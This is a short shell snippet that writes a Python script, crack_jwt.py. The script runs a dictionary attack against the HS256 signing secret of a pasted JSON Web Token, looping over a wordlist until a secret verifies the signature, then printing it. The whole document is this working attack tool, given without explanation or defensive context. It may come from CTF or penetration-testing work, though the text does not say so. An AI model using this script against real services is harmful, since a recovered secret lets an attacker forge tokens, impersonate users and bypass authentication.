cat << 'EOF' > crack_jwt.py
import jwt
import sys

token = "PASTE_YOUR_FULL_JWT_HERE"

with open("jwt.secrets.list", "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        secret = line.strip()
        if not secret:
            continue
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            print(f"[+] FOUND SECRET: {secret}")
            sys.exit(0)
        except jwt.InvalidSignatureError:
            continue
        except Exception:
            continue
print("[-] No match found")
EOF
